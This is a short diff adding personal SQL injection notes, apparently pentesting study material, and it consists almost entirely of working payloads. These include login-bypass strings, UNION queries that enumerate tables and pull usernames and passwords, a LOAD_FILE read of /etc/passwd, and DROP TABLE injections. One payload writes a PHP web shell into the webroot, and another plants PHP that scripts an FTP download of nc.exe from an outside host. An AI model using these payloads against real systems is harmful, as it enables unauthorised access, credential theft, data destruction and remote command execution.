@@ -1,0 +1,43 @@
+
+SQLi notes
+==========
+
+Login bypass
+any' or 1=1 limit 1 ;#
+' OR '1' = '1 / ' OR '1' = '1
+;#   ;--   #
+
+
+?id=737 order by 6   --> Testing max columns
+?id=737 union select all 1,2,3,4,5,6    --> Testing max columns in database
+?id=737 union select all 1,2,3,4,@@version,6    --> Version enumeration, commands to run or exploits?
+?id=737 union select all 1,2,3,4,table_name,6 FROM information_schema.tables    --> Table enumeration
+?id=737 union select all 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='user'    --> Column enumeration
+?id=737 union select 1,2,3,4,concat(name,0x3a,password ),6 FROM users    --> After knowing about "users" pull out the info
+
+
+More examples
+
+x%') # 
+x%') or 1=1 #
+x%') order by 4 #
+x%') union select all 4 #
+x%') union select all 1,2,3@@version #
+x%') and 1=1 #
+
+x%') and UNION ALL SELECT LOAD_FILE(‘/etc/passwd’) #
+x%') and drop table if exists customers #
+x%') and create database test # 
+x%') ; DROP ALL TABLES; #
+
+@@hostname
+
+wget -qO- http://www.site.com --user-agent=useragent --post-data="key=value"
+
+
+Adding backdor.php
+?id=737 union select all 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'
+
+Getting a shell with php execute
+192.168.3.1/comment.php?id=737 union select all 1,2,3,4,"<? system('echo open 192.168.1.9 21 > ftp.txt'); ?><? system('echo haxor>> ftp.txt'); ?><? system('echo haxor>> ftp.txt'); ?><? system('echo bin >> ftp.txt'); ?><? system('echo GET nc.exe >> ftp.txt'); ?><? system('echo bye >> ftp.txt'); ?>",6 into OUTFILE 'c:/xampp/htdocs/makeftp12.php'
+
